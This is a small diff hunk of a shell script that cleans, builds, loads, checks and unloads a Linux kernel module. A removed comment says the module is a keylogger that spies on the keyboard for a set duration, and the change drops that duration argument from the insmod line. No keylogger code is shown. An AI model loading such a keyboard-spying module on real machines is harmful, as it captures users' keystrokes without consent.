@@ -11,7 +11,7 @@ make clean
 sleep 1
 make 
 sleep 1
-sudo insmod lkm.ko duration="10" # the duration of th keylogger, in seconds. If duration=15, it will run(spy on keyboard) for 15 seconds before quitting.
+sudo insmod lkm.ko
 sleep 5
 sudo dmesg
 sudo rmmod lkm.ko
